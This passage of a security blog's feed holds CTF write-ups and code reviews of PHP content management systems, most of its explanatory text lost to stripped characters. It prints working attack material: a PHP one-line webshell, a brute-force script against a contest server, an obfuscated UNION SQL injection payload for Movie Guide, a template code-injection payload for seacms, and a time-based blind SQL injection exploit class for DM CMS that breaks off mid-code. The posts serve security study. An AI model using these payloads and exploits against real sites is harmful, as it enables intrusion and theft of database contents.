rel="noopener">https://stackoverflow.com/questions/39518979/basic-program-for-encrypt-decrypt-javax-crypto-badpaddingexception-decryption?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa</a><br><br>flag</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ddctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHITB-XCTF 2018 web writeup</title>
      <link href="2018/04/15/ctf/hitb-xctf-2018-portion-web-writeup/"/>
      <url>2018/04/15/ctf/hitb-xctf-2018-portion-web-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><a id="more"></a><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>windows</p><ul><li><p>windows<br>windowsFindFirstFile<code>&quot;&lt;&quot; =&gt; &quot;*&quot;</code><code>&quot;&gt;&quot; =&gt; &quot;?&quot;</code><code>&quot; =&gt; .</code>e.g.</p><pre><code>`?filename=a&gt;  =&gt;  a?` `?filename=a&lt;  =&gt;  a*` `?filename=a&quot;  =&gt;  a.`</code></pre></li><li><p>NTFS ADS</p></li></ul><table><thead><tr><th style="text-align:center"></th><th style="text-align:center"></th></tr></thead><tbody><tr><td style="text-align:center">test.php:a.jpg</td><td style="text-align:center">test.php</td></tr><tr><td style="text-align:center">test.php::$DATA</td><td style="text-align:center">test.php</td></tr><tr><td style="text-align:center">test.php::$INDEX_ALLOCATION</td><td style="text-align:center">test.php</td></tr><tr><td style="text-align:center">test.php::$DATA.jpg</td><td style="text-align:center">0.jpg</td></tr><tr><td style="text-align:center">test.php::$DATA\test.jpg</td><td style="text-align:center">aaa.jpg</td></tr></tbody></table><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li><p>step 1:<br># # =&gt; getshell<br>IIS7.0 Windows Server 2008 Standard Edition Service Pack 2</p></li><li><p>step 2:<br>phpADStest.php::$DATA</p></li><li><p>step 3:<br>pic.phpgetimagesize<a href="https://xianzhi.aliyun.com/forum/topic/2064" target="_blank" rel="noopener"></a></p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Created by wh1t3P1g at 2018/4/11</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">str=&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">ret=&quot;&quot;</span><br><span class="line">for i in range(32):</span><br><span class="line">    for c in str:</span><br><span class="line">        t=ret+c</span><br><span class="line">        url=&quot;http://47.90.97.18:9999/pic.php?filename=../&quot;+t+&quot;%3C/1523456340.jpg&quot;</span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        if &quot;width&quot; in r.content:</span><br><span class="line">            ret+=c</span><br><span class="line">            print ret</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>87194f13726af7cee27ba2cfe97b60df</p><ul><li>step 4:<br><code>&lt;?php eval($_POST[cmd]);?&gt;</code><br><br><code>cmd=var_dump(glob(&quot;../*&quot;));</code>flag.phpflag.php<br><code>cmd=echo readfile(&quot;../flag.php&quot;);</code>flag</li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>web:)</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hitbxctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Code AnalysisMovieGuide v2.0 SQLi</title>
      <link href="2018/02/03/php/MovieGuide2SQLi/"/>
      <url>2018/02/03/php/MovieGuide2SQLi/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>Detail: <a href="https://www.exploit-db.com/exploits/43346/" target="_blank" rel="noopener">Movie Guide v2.0 SQL Injection</a></p><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>cmsPoC</p><h3 id="PoCindex-php-md-SQL"><a href="#PoCindex-php-md-SQL" class="headerlink" title="PoCindex.php?md=[SQL]"></a>PoCindex.php?md=[SQL]</h3><p>md<br>layout.phpcms,SQL<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Get the passed variables.</span></span><br><span class="line">$mterm = filter_input(INPUT_POST, <span class="string">'tterm'</span>);</span><br><span class="line">$cterm = filter_input(INPUT_POST, <span class="string">'gterm'</span>);</span><br><span class="line">$lterm = filter_input(INPUT_GET, <span class="string">'gterm'</span>);</span><br><span class="line">$yterm = filter_input(INPUT_GET, <span class="string">'year'</span>);</span><br><span class="line">$md = filter_input(INPUT_GET, <span class="string">'md'</span>);</span><br><span class="line">$actorname = filter_input(INPUT_GET, <span class="string">'actor'</span>);</span><br><span class="line">$directorname = filter_input(INPUT_GET, <span class="string">'director'</span>);</span><br></pre></td></tr></table></figure></p><p>SQL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM `Movie_List` WHERE `Main_Dir` LIKE &apos;&quot; . $md . &quot;&apos; ORDER BY `Movie_Title` ASC Limit $start, $perpage&quot;;</span><br></pre></td></tr></table></figure></p><p>PoC:bPoCexport_set</p><h3 id="EXPORT-SET-bits-on-off-separator-number-of-bits"><a href="#EXPORT-SET-bits-on-off-separator-number-of-bits" class="headerlink" title="EXPORT_SET(bits,on,off[,separator[,number_of_bits]])"></a><code>EXPORT_SET(bits,on,off[,separator[,number_of_bits]])</code></h3><p><code>Returns a string such that for every bit set in the value bits, you get an on string and for every bit not set in the value, you get an off string. Bits in bits are examined from right to left (from low-order to high-order bits). Strings are added to the result from left to right, separated by the separator string (the default being the comma character ,). The number of bits examined is given by number_of_bits, which has a default of 64 if not specified. number_of_bits is silently clipped to 64 if larger than 64. It is treated as an unsigned integer, so a value of 1 is effectively the same as 64.</code></p><p>PoC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/*!02222UNION*/</span><br><span class="line">(</span><br><span class="line">    /*!02222SELECT*/ 0x253238253331253239,0x253238253332253239,</span><br><span class="line">        (</span><br><span class="line">            /*!02222Select*/</span><br><span class="line">                export_set(5,@a:=0,</span><br><span class="line">                (/*!02222select*/ count(*)/*!02222from*/(information_schema.columns)where@a:=// data-&gt;@a</span><br><span class="line">                    export_set(5,</span><br><span class="line">                        export_set(5,@a,/*!02222table_name*/,&apos;&lt;li&gt;&apos;,2)//dump table_name [0&lt;li&gt;table_name]</span><br><span class="line">                    ,/*!02222column_name*/,&apos;\n:&apos;,2)//dump column_name [0&lt;li&gt;table_name\n:columns_name]</span><br><span class="line">                )</span><br><span class="line">            ,@a,2)//set @a split char</span><br><span class="line">        )</span><br><span class="line">    ,0x253238253334253239,0x253238253335253239,0x253238253336253239,0x253238253337253239,0x253238253338253239,0x253238253339253239,0x253238253331253330253239,0x253238253331253331253239,0x253238253331253332253239</span><br><span class="line">    )-- -</span><br></pre></td></tr></table></figure></p><p>export_setnooffdump</p><ul><li>@a:=0a0mysql5.7.xmysql@:=0</li><li>export_settable_name dump<code>0&lt;li&gt;table_name</code></li><li>export_setcolumns_name dump(<code>0&lt;li&gt;table_name\n:columns_name</code>)</li><li><code>select count(*) from (information_schema.columns)where@a:=export_set(5,export_set(5,@a,table_name,&#39;&lt;li&gt;&#39;,2),column_name,&#39;\n:&#39;,2)</code>a</li><li>export_set@adump</li></ul><h2 id="0x02-"><a href="#0x02-" class="headerlink" title="0x02 "></a>0x02 </h2><p>cmsPoC</p><ol><li>mysql@<code>\bwhere\b</code></li><li>/!02222select*/</li><li>export_set</li></ol>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Code Reviewseacms v6.5 getshell</title>
      <link href="2017/03/16/old-old-seacms-v6-5-getshell/"/>
      <url>2017/03/16/old-old-seacms-v6-5-getshell/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p><a href="https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=10291" target="_blank" rel="noopener">90sec</a><br><a id="more"></a></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>cms6.45<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">function parseIf($content)&#123;</span><br><span class="line">if (strpos($content,&apos;&#123;if:&apos;)=== false)&#123;</span><br><span class="line">return $content;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;);</span><br><span class="line">$labelRule2=&quot;&#123;elseif&quot;;</span><br><span class="line">$labelRule3=&quot;&#123;else&#125;&quot;;</span><br><span class="line">preg_match_all($labelRule,$content,$iar);</span><br><span class="line">$arlen=count($iar[0]);</span><br><span class="line">$elseIfFlag=false;</span><br><span class="line">for($m=0;$m&lt;$arlen;$m++)&#123;</span><br><span class="line">$strIf=$iar[1][$m];</span><br><span class="line">$strIf=$this-&gt;parseStrIf($strIf);</span><br><span class="line">$strThen=$iar[2][$m];</span><br><span class="line">$strThen=$this-&gt;parseSubIf($strThen);</span><br><span class="line">if (strpos($strThen,$labelRule2)===false)&#123;</span><br><span class="line">if (strpos($strThen,$labelRule3)&gt;=0)&#123;</span><br><span class="line">$elsearray=explode($labelRule3,$strThen);</span><br><span class="line">$strThen1=$elsearray[0];</span><br><span class="line">$strElse1=$elsearray[1];</span><br><span class="line">                    echo &quot;if(&quot;.$strIf.&quot;) &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;&quot;;</span><br><span class="line">                    eval(&quot;if(&quot;.$strIf.&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;);</span><br><span class="line">if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">@eval(&quot;if(&quot;.$strIf.&quot;) &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;&quot;);</span><br><span class="line">if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],&quot;&quot;,$content);&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$elseIfArray=explode($labelRule2,$strThen);</span><br><span class="line">$elseIfArrayLen=count($elseIfArray);</span><br><span class="line">$elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]);</span><br><span class="line">$resultStr=$elseIfSubArray[1];</span><br><span class="line">$elseIfArraystr0=addslashes($elseIfArray[0]);</span><br><span class="line">@eval(&quot;if($strIf)&#123;\$resultStr=\&quot;$elseIfArraystr0\&quot;;&#125;&quot;);</span><br><span class="line">for($elseIfLen=1;$elseIfLen&lt;$elseIfArrayLen;$elseIfLen++)&#123;</span><br><span class="line">$strElseIf=getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;);</span><br><span class="line">$strElseIf=$this-&gt;parseStrIf($strElseIf);</span><br><span class="line">$strElseIfThen=addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;));</span><br><span class="line">@eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\$resultStr=\&quot;$strElseIfThen\&quot;;&#125;&quot;);</span><br><span class="line">@eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\$elseIfFlag=true;&#125;else&#123;\$elseIfFlag=false;&#125;&quot;);</span><br><span class="line">if ($elseIfFlag) &#123;break;&#125;</span><br><span class="line">&#125;</span><br><span class="line">$strElseIf0=getSubStrByFromAndEnd($elseIfSubArray[0],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;);</span><br><span class="line">$strElseIfThen0=addslashes(getSubStrByFromAndEnd($elseIfSubArray[0],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;));</span><br><span class="line">if(strpos($strElseIf0,&apos;==&apos;)===false&amp;&amp;strpos($strElseIf0,&apos;=&apos;)&gt;0)$strElseIf0=str_replace(&apos;=&apos;, &apos;==&apos;, $strElseIf0);</span><br><span class="line">@eval(&quot;if(&quot;.$strElseIf0.&quot;)&#123;\$resultStr=\&quot;$strElseIfThen0\&quot;;\$elseIfFlag=true;&#125;&quot;);</span><br><span class="line">$content=str_replace($iar[0][$m],$resultStr,$content);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return $content;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>html{if:}{end if}eval<br>search.php<br>line 212<code>$content=$mainClassObj-&gt;parseIf($content);</code><br><code>{searchpage:page}</code><br>2ifif<br>if<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function echoSearchPage()</span><br><span class="line">&#123;</span><br><span class="line">        global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost;</span><br><span class="line">        $order = !empty($order)?$order:time;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">$content = str_replace(&quot;&#123;searchpage:page&#125;&quot;,$page,$content);</span><br><span class="line">        $content = str_replace(&quot;&#123;seacms:searchword&#125;&quot;,$searchword,$content);</span><br><span class="line">        $content = str_replace(&quot;&#123;seacms:searchnum&#125;&quot;,$TotalResult,$content);</span><br><span class="line">        $content = str_replace(&quot;&#123;searchpage:ordername&#125;&quot;,$order,$content);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>orderparseIforderif<br>html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;btn-toolbar&quot; role=&quot;toolbar&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;btn-group&quot;&gt;</span><br><span class="line">      &lt;a href=&quot;&#123;searchpage:order-time-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;time&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderhits&quot;&gt;&lt;/a&gt;</span><br><span class="line">      &lt;a href=&quot;&#123;searchpage:order-hit-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;hit&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderaddtime&quot;&gt;&lt;/a&gt;</span><br><span class="line">      &lt;a href=&quot;&#123;searchpage:order-score-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;score&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;ordergold&quot;&gt;&lt;/a&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br></pre></td></tr></table></figure></p><p>pocsqlifif<br>example<code>}{end if}{if:1)phpinfo();if(1}{end if}</code><br><br><img src="http://blog.0kami.cn/img/seacms/1.png" alt></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p><br>ps: pocT_T</p>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFNJCTF2017 writeup</title>
      <link href="2017/03/15/old-old-njctf-2017/"/>
      <url>2017/03/15/old-old-njctf-2017/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>njctf7ps:webwriteup<br><a id="more"></a></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="Login100"><a href="#Login100" class="headerlink" title="Login100"></a>Login100</h3><p><br><br>mysql2mysql</p><ol><li>mysql</li><li>selectwheremysql<br>2admin+N*%20+xadmingetflagNJCTF{4R3_Y0u_7H3_Re41_aDM1N?}</li></ol><h3 id="Get-Flag-100"><a href="#Get-Flag-100" class="headerlink" title="Get Flag(100)"></a>Get Flag(100)</h3><p><br>app.py<br><img src="http://blog.0kami.cn/img/njctf_2017_3_13/1.png" alt><br>&amp;<br>ls <br><img src="http://blog.0kami.cn/img/njctf_2017_3_13/2.png" alt><br>flag<br><code>9iZM2qTEmq67SOdJp%!oJm2%M4!nhS_thi5_flag</code><br>cat<br><img src="http://blog.0kami.cn/img/njctf_2017_3_13/3.png" alt></p><h3 id="come-on-200"><a href="#come-on-200" class="headerlink" title="come on(200)"></a>come on(200)</h3><p>writeup<br>binary</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select xxx from xxx like x%</span><br><span class="line">select xxx from xxx like xx%</span><br><span class="line">select xxx from xxx like xxx%</span><br><span class="line">select xxx from xxx like xxxx%</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>like</p><h3 id="Be-Admin-300"><a href="#Be-Admin-300" class="headerlink" title="Be Admin(300)"></a>Be Admin(300)</h3><p>.bak,cbcpadding oracle attack.<br>encrypt_pass<br>phpadmin0<br>cbcdefaultIddefaultId<br>padding oracle attack<a href="http://www.freebuf.com/articles/web/15504.html" target="_blank" rel="noopener">padding oracle attack</a><br></p><ol><li>IV</li><li>cipher text</li><li>ERROR<br><br>padding oracle attackerrorps</li></ol><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> njctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OTHERSphp</title>
      <link href="2017/02/03/old-old-code-review-pre-prepare/"/>
      <url>2017/02/03/old-old-code-review-pre-prepare/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>,</p><a id="more"></a><h1 id=""><a href="#" class="headerlink" title=""></a></h1><ol><li>Mac</li><li>xampp(phpstudy)</li><li>Navicat Premium(Mac**,)</li><li>phpstorm(IDE)</li><li>xdebug()</li><li></li><li>(firefoxchrome,firefox,hackbar)</li></ol><p></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="phpxdebug"><a href="#phpxdebug" class="headerlink" title="phpxdebug"></a>phpxdebug</h2><p>xamppphp.ini<code>/install/path/etc/php.ini</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension=/Applications/XAMPP/xamppfiles/lib/php/extensions/no-debug-non-zts-20131226/xdebug.so</span><br><span class="line">xdebug.remote_autostart=on</span><br><span class="line">xdebug.remote_enable=on</span><br><span class="line">xdebug.remote_enable=1</span><br><span class="line">xdebug.remote_mode=&quot;req&quot;</span><br><span class="line">xdebug.remote_log=&quot;/var/log/xdebug.log&quot;</span><br><span class="line">xdebug.remote_host=localhost/127.0.0.1</span><br><span class="line">xdebug.remote_port=9000</span><br><span class="line">xdebug.remote_handler=&quot;dbgp&quot;</span><br><span class="line">xdebug.idekey=&quot;PhpStorm&quot;</span><br></pre></td></tr></table></figure><p>soxamppmaccopy<br>apache</p><h2 id="firefoxxdebug"><a href="#firefoxxdebug" class="headerlink" title="firefoxxdebug"></a>firefoxxdebug</h2><p>firefoxxdebug the easiest xdebug<br><br><img src="../../../../img/pre_code_review/bug.png" alt><br>key,php<br><img src="../../../../img/pre_code_review/bug2.png" alt></p><h2 id="phpstorm"><a href="#phpstorm" class="headerlink" title="phpstorm"></a>phpstorm</h2><p>Preferences-&gt;Languages&amp;Framework-&gt;php<br><img src="../../../../img/pre_code_review/step1.png" alt><br>serversdebugDBGp Proxy<br><img src="../../../../img/pre_code_review/step2.png" alt><br>edit Configurations<br><img src="../../../../img/pre_code_review/step3.png" alt><br>php web application<br><img src="../../../../img/pre_code_review/step4.png" alt><br></p><h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><p>navicat2</p><blockquote><p>set global general_log=on;<br>set global log_output=table;</p></blockquote><p>mysql.general_logsql<br>winseaymysqlsql</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>grep<br><br></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>:P</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Code ReviewDM</title>
      <link href="2017/01/29/old-old-DM-sql-injection/"/>
      <url>2017/01/29/old-old-DM-sql-injection/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p><a href="http://www.demososo.com/down.html" target="_blank" rel="noopener">DM2017.01.23</a></p><a id="more"></a><h1 id="cookie-"><a href="#cookie-" class="headerlink" title="cookie "></a>cookie </h1><p>cms<code>htmlentities</code>POST&amp;&amp;GEThtml<a href="http://www.php.net/manual/en/function.htmlentities.php" target="_blank" rel="noopener">htmlentities</a>sqlsql<br></p><ol><li>POST&amp;&amp;GET</li><li>COOKIE </li></ol><p>ps :P</p><p>POST&amp;&amp;GETgrepcookiecookie<br>indexDM_load.php Line 108</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">if(@$_COOKIE[&quot;curstyle&quot;]&lt;&gt;&apos;&apos;) </span><br><span class="line">    $curstyle = $_COOKIE[&quot;curstyle&quot;];</span><br><span class="line">else </span><br><span class="line">    $curstyle = $row[&apos;curstyle&apos;];</span><br><span class="line">    </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$sqlstyle = &quot;SELECT * from &quot;.TABLE_STYLE.&quot; where pidname=&apos;$curstyle&apos; $andlangbh limit 1&quot;; </span><br><span class="line"> //echo $sqlstyle;exit;</span><br><span class="line">if(getnum($sqlstyle)&gt;0)&#123;</span><br><span class="line">$rowstyle = getrow($sqlstyle);</span><br></pre></td></tr></table></figure><p>cookiecurstyle,cookie</p><p>EXP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Created by wh1t3P1g at 2017/1/30</span><br><span class="line"></span><br><span class="line">import requests,time</span><br><span class="line"></span><br><span class="line">class CookieBlindSqlInjection:</span><br><span class="line"></span><br><span class="line">    def __init__(self,url):</span><br><span class="line">        self.url=url</span><br><span class="line">        self.len=0</span><br><span class="line"></span><br><span class="line">    def getLength(self,column,table):</span><br><span class="line">        payload0 = &quot;curstyle=1&apos;||if((select length(cast(bin(length(&#123;column&#125;)) as char)) from &#123;table&#125; limit &#123;line_start&#125;,1)=&#123;flag&#125;,sleep(5),1)=1#&quot;</span><br><span class="line">        payload1 = &quot;curstyle=1&apos;||if((select substr(bin(length(&#123;column&#125;)),&#123;col_start&#125;,1) from &#123;table&#125; limit &#123;line_start&#125;,1)=1,1,sleep(5))=1#&quot;</span><br><span class="line">        #first confirm bin-format data length</span><br><span class="line">        len=0</span><br><span class="line">        for i in range(1,9):</span><br><span class="line">            cookie=payload0.format(column=column,table=table,line_start=0,flag=i)</span><br><span class="line">            flag=self.send(cookie)</span><br><span class="line">            if flag==&quot;0&quot;:</span><br><span class="line">                len=i</span><br><span class="line">                break</span><br><span class="line">        res=&quot;&quot;</span><br><span class="line">        for i in range(1,len+1):</span><br><span class="line">            cookie=payload1.format(column=column,col_start=i,table=table,line_start=0)</span><br><span class="line">            flag=self.send(cookie)</span><br><span class="line">            res+=flag</span><br><span class="line">            # print res</span><br><span class="line">        self.len=int(res,2)</span><br><span class="line">        pprint(&quot;*&quot;, &quot;fetch &quot;+column+&quot; length: &quot;+str(self.len))</span><br><span class="line">        return int(res,2)</span><br><span class="line"></span><br><span class="line">    def getData(self,column,table):</span><br><span class="line">        payload0=&quot;curstyle=1&apos;||if((select length(cast(bin(ascii(substr(&#123;column&#125;,&#123;data_start&#125;,1))) as char)) from &#123;table&#125; limit &#123;line_start&#125;,1)=&#123;flag&#125;,sleep(5),1)=1#&quot;</span><br><span class="line">        payload1 = &quot;curstyle=1&apos;||if((select substr(bin(ascii(substr(&#123;column&#125;,&#123;data_start&#125;,1))),&#123;col_start&#125;,1) from &#123;table&#125; limit 